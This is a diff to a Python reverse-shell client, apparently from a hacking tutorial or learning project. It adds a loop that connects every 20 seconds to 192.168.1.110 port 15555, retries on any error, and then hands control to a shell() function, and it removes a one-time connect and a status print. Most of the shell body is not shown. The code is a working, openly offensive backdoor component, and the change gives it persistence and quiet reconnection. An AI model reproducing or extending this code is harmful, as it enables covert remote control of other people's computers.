@@ -2,6 +2,7 @@
 import socket
 import subprocess
 import json
+import time
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -17,6 +18,14 @@ def reliable_recv():
         except ValueError:
             continue
 
+def connection():
+    while True:
+        time.sleep(20)
+        try:
+            sock.connect(('192.168.1.110', 15555))
+            shell()
+        except:
+            connection()
 
 def shell():
     while True:
@@ -33,8 +42,5 @@ def shell():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(('192.168.1.110', 15555))
-print('Connection esablished to Server')
-
-shell()
+connection()
 sock.close()
